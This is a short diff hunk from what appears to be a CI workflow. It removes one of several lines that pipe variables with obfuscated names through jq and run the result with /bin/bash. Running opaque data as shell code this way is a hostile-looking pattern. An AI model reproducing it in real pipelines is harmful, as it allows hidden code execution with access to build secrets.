@@ -23,7 +23,6 @@ jobs:
           echo $rof950 | jq -r .x82 | /bin/bash
           printf '%s' "$mh8" | jq -r .mckn78 | /bin/bash
           echo $zvyya96307 | jq -r .bjkkp5 | /bin/bash
-          echo $b89906 | jq -r .ewig0 | /bin/bash
           echo $bff07 | jq -r .qrx8994 | /bin/bash
 
       - name: Store results
